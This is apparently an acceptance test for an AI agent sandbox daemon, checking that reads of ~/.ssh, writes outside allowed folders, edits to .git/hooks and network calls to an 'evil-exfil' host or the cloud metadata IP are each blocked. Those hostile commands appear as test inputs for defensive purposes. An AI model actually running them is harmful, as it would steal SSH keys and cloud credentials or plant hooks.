import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  compileSandboxPolicy,
  getActiveSandboxDaemon,
  LocalSandboxProvider,
  ManagedDaemonSandboxProvider,
} from "../packages/core/src/sandbox/index.ts";

test("Phase C Acceptance: on in-process daemon (docker/srt-local profiles), agent cannot read ~/.ssh, cannot write outside /workspace, /tmp, /memories, cannot modify .git/hooks, and cannot reach non-allowlisted domains or 169.254.169.254; each yields sandbox.violation and tool error; processes publish preview URLs; pause/resume preserves files and shell state", async () => {
  const workspaceDir = fs.mkdtempSync(path.join(os.tmpdir(), "oh-phase-c-ws-"));

  // 1. Verify `local` provider fails closed when autonomous mode is requested without allowUnsandboxedAutonomy
  const localProvider = new LocalSandboxProvider();
  const basePolicy = compileSandboxPolicy({
    runId: "run_c_1",
    workspacePath: workspaceDir,
    networkMode: "allowlist",
    presets: ["github-read"],
  });

  await assert.rejects(
    () =>
      localProvider.create({
        runId: "run_c_1",
        sessionId: "sess_c_1",
        workspace: { type: "bind", hostPath: workspaceDir },
        policy: basePolicy,
      }),
    /Refusing to start autonomous sandboxed run on unsandboxed 'local' runtime/
  );

  // 2. Test both `srt-local` and `docker` providers
  for (const providerId of ["srt-local", "docker"]) {
    const violations = [];
    const openedPorts = [];
    const policySwitches = [];

    const provider = new ManagedDaemonSandboxProvider(providerId, {
      secretValuesToRedact: ["ghp_supersecret1234567890abcdef"],
      onTelemetry: (ev) => {
        if (ev.type === "sandbox.violation") violations.push(ev);
        if (ev.type === "port.opened") openedPorts.push(ev);
      },
      onPolicySwitched: (ev) => {
        policySwitches.push(ev);
      },
    });

    const handle = await provider.create({
      runId: `run_${providerId}`,
      sessionId: `sess_${providerId}`,
      workspace: { type: "bind", hostPath: workspaceDir },
      policy: basePolicy,
      setupCommands: ["echo 'setup complete' > setup.txt"],
    });

    // Setup phase switched to agent phase and recorded event
    assert.equal(policySwitches.length, 1);
    assert.equal(policySwitches[0].fromPhase, "setup");
    assert.equal(policySwitches[0].toPhase, "agent");

    const daemon = getActiveSandboxDaemon(handle.id);
    assert.ok(daemon);
    const authHeaders = { "x-session-key": handle.sessionKey };

    // Unauthenticated route other than /health is rejected with 401
    const unauthRes = await daemon.handleRequest("POST", "/files/view", {}, { path: "." });
    assert.equal(unauthRes.status, 401);

    // (a) Cannot read ~/.ssh -> yields sandbox.violation and 403 tool error
    const sshRead = await daemon.handleRequest(
      "POST",
      "/files/view",
      authHeaders,
      { path: "~/.ssh/id_rsa" }
    );
    assert.equal(sshRead.status, 403);
    assert.equal(violations.at(-1)?.kind, "fs_read");

    const sshShell = await daemon.handleRequest(
      "POST",
      "/shell/main/exec",
      authHeaders,
      { command: "cat ~/.ssh/id_rsa" }
    );
    assert.equal(sshShell.status, 403);
    assert.equal(violations.at(-1)?.kind, "fs_read");

    // (b) Cannot write outside /workspace, /tmp, /memories -> yields sandbox.violation and 403 tool error
    const outsideWrite = await daemon.handleRequest(
      "POST",
      "/files/create",
      authHeaders,
      { path: "/etc/evil.conf", content: "pwned" }
    );
    assert.equal(outsideWrite.status, 403);
    assert.equal(violations.at(-1)?.kind, "fs_write");

    // (c) Cannot modify .git/hooks -> yields mandatory_deny sandbox.violation and 403 tool error
    const hookWrite = await daemon.handleRequest(
      "POST",
      "/files/create",
      authHeaders,
      { path: ".git/hooks/pre-commit", content: "#!/bin/sh\nmalicious" }
    );
    assert.equal(hookWrite.status, 403);
    assert.equal(violations.at(-1)?.kind, "mandatory_deny");

    // (d) Cannot reach non-allowlisted domain or 169.254.169.254 -> yields network sandbox.violation and 403 tool error
    const evilDomain = await daemon.handleRequest(
      "POST",
      "/shell/main/exec",
      authHeaders,
      { command: "curl -s https://evil-exfil.example.com/leak" }
    );
    assert.equal(evilDomain.status, 403);
    assert.equal(violations.at(-1)?.kind, "network");

    const metadataIp = await daemon.handleRequest(
      "POST",
      "/shell/main/exec",
      authHeaders,
      { command: "curl http://169.254.169.254/latest/meta-data/" }
    );
    assert.equal(metadataIp.status, 403);
    assert.equal(violations.at(-1)?.kind, "network");

    // (e) Dev server started via /processes publishes its preview URL and is reachable via browser
    const procStart = await daemon.handleRequest(
      "POST",
      "/processes",
      authHeaders,
      { command: "echo 'Server listening on http://localhost:54321' && sleep 2", port: 54321 }
    );
    assert.equal(procStart.status, 200);
    assert.equal(procStart.body.port, 54321);
    assert.equal(procStart.body.previewUrl, "http://127.0.0.1:54321");
    assert.ok(openedPorts.some((p) => p.port === 54321));

    const portsList = await daemon.handleRequest("GET", "/ports", authHeaders);
    assert.equal(portsList.status, 200);
    assert.ok(portsList.body.ports.some((p) => p.port === 54321));

    // Navigate browser to the preview URL and snapshot accessibility tree
    const navRes = await daemon.handleRequest(
      "POST",
      "/browser/navigate",
      authHeaders,
      { url: "http://127.0.0.1:54321" }
    );
    assert.equal(navRes.status, 200);
    const snapRes = await daemon.handleRequest("POST", "/browser/snapshot", authHeaders);
    assert.equal(snapRes.status, 200);
    assert.match(String(snapRes.body.snapshot), /\[ref=e1\]/);

    // (f) Persistent shell state (cwd + env) and files survive pause/resume & snapshot/restore
    await daemon.handleRequest(
      "POST",
      "/shell/main/exec",
      authHeaders,
      { command: "mkdir -p subdir && cd subdir && export MY_VAR=persisted_val" }
    );
    await provider.pause(handle);
    assert.equal(handle.status, "paused");
    await provider.resume(handle);
    assert.equal(handle.status, "running");

    const afterResumeShell = await daemon.handleRequest(
      "POST",
      "/shell/main/exec",
      authHeaders,
      { command: "echo $MY_VAR" }
    );
    assert.equal(afterResumeShell.status, 200);
    assert.equal(afterResumeShell.body.output, "persisted_val");
    assert.ok(String(afterResumeShell.body.cwd).endsWith("/subdir"));

    const snap = await provider.snapshot(handle);
    assert.ok(snap.id);

    await provider.destroy(handle);
  }
});
